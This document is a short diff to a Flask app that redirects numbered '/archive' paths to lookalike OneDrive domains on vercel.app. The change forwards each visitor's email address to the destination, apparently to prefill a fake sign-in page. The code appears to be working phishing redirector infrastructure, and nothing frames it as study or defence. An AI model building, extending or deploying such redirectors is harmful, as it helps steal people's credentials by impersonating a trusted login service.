@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, redirect, render_template
 
 app = Flask(__name__)
 
@@ -21,19 +21,26 @@ def get_redirect_url(path):
     elif path == '/archive8':
         return 'https://onedrive-sharing.vercel.app/'
     elif path == '/archive3467':
-        return 'https://secure-xhr.vercel.app/'
+        return 'https://auth-onedrive.vercel.app/'
     elif path == '/archive9':
         return 'https://onedrive-sharing.vercel.app/'
-    # Add more cases for additional paths and intermediary URLs as needed
     else:
         return 'https://onedrive-sharing.vercel.app/'
 
-# Route to handle redirection for paths '/path1' to '/path8'
+# Route to handle redirection for paths '/archive<int:num>'
 @app.route('/archive<int:num>')
 def path_handler(num):
     path = f'/archive{num}'
     redirect_url = get_redirect_url(path)
-    return render_template('redirect.html', redirect_url=redirect_url)
+
+    # Capture the email parameter from the request
+    email = request.args.get('email')
+
+    # If an email parameter is present, append it to the redirect URL
+    if email:
+        redirect_url = f"{redirect_url}?email={email}"
+
+    return redirect(redirect_url)
 
 # Route for the main page
 @app.route('/hello')
